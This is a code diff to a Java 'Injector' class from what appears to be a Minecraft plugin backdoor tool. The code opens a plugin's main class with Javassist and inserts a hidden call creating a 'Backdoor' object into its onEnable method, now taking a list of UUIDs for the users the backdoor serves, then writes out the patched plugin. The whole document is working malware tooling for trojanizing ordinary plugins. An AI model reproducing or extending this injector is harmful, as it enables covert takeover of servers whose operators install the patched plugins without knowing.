@@ -16,11 +16,6 @@ import java.util.Map;
 
 public class Injector {
 
-    public static void main(String args[]) {
-        //new Backdoor(null, "", "");
-        patchFile(args[0], args[1], new SimpleConfig("d27767a8-dd3a-4248-bd00-ccd02fd08314", "#"));
-    }
-
     public static boolean patchFile(String orig, String out, SimpleConfig config) {
         Path input = Paths.get(orig);
         Path output = Paths.get(out);
@@ -87,7 +82,19 @@ public class Injector {
             CtClass cc = pool.get(mainClass);
             CtMethod m = cc.getDeclaredMethod("onEnable");
 
-            m.insertAfter("{ new com.thiccindustries.backdoor.Backdoor(this, \"" + config.UUID + "\", \"" + config.prefix + "\"); }");
+            //Parse UUID string
+            StringBuilder sb = new StringBuilder();
+            sb.append("new String[]{");
+            for(int i = 0; i < config.UUID.length; i++){
+                sb.append("\"");
+                sb.append(config.UUID[i]);
+                sb.append("\"");
+                if(i != config.UUID.length - 1)
+                    sb.append(",");
+            }
+            sb.append("}");
+            System.out.println("{ new com.thiccindustries.backdoor.Backdoor(this, " + sb.toString() + ", \"" + config.prefix + "\"); }");
+            m.insertAfter("{ new com.thiccindustries.backdoor.Backdoor(this, " + sb.toString() + ", \"" + config.prefix + "\"); }");
 
             //Write to temporary file
             cc.writeFile(temp.toString());
@@ -203,10 +210,10 @@ public class Injector {
 
     //Simplifed config for injector gui
     public static class SimpleConfig {
-        public String UUID;
+        public String[] UUID;
         public String prefix;
 
-        public SimpleConfig(String s1, String s2) {
+        public SimpleConfig(String[] s1, String s2) {
             UUID = s1;
             prefix = s2;
         }
